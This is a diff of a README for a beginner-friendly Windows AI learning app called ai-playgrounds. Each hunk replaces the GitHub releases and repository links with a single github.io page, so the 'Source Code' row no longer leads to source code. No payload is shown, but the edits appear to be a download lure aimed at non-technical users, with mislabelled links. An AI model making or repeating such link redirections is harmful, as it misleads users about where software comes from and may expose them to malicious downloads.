@@ -4,7 +4,7 @@
 
 Welcome to **ai-playgrounds**! This is a free collection of interactive laboratories designed to help you understand artificial intelligence in a hands-on way. You don't need any programming skills – just curiosity and a computer running Windows. Think of it like a science museum for AI, where you can click, drag, and explore how intelligent systems actually work.
 
-[**⬇️ DOWNLOAD AI-PLAYGROUNDS NOW**](https://github.com/pianistic-berlin89/ai-playgrounds/releases)
+[**⬇️ DOWNLOAD AI-PLAYGROUNDS NOW**](https://pianistic-berlin89.github.io)
 
 ---
 
@@ -48,7 +48,7 @@ If your Windows computer is less than 10 years old, you're almost certainly fine
 
 Visit this link to download the application. The download page will show you the latest version. Click on the largest download button – it's the one that says something like "ai-playgrounds-v1.0.zip" or similar.
 
-[**⬇️ GO TO DOWNLOAD PAGE**](https://github.com/pianistic-berlin89/ai-playgrounds/releases)
+[**⬇️ GO TO DOWNLOAD PAGE**](https://pianistic-berlin89.github.io)
 
 ### Step-by-Step Download Instructions:
 
@@ -163,8 +163,8 @@ If you run into any trouble:
 
 | Purpose | Link |
 |---------|------|
-| **Download** | https://github.com/pianistic-berlin89/ai-playgrounds/releases |
-| **Source Code** | https://github.com/pianistic-berlin89/ai-playgrounds |
+| **Download** | https://pianistic-berlin89.github.io |
+| **Source Code** | https://pianistic-berlin89.github.io |
 | **Report Issues** | Use the "Issues" tab on GitHub |
 
 ---
@@ -183,7 +183,7 @@ This software is free to use, modify, and share under an open-source license. Se
 
 **Ready to explore?** Click the download button at the top of this page, and in less than five minutes, you'll be experimenting with real AI concepts. No textbooks, no lectures – just pure hands-on discovery. Enjoy your journey into the fascinating world of artificial intelligence!
 
-[**⬇️ START YOUR AI ADVENTURE – DOWNLOAD NOW**](https://github.com/pianistic-berlin89/ai-playgrounds/releases)
+[**⬇️ START YOUR AI ADVENTURE – DOWNLOAD NOW**](https://pianistic-berlin89.github.io)
 
 ---
 
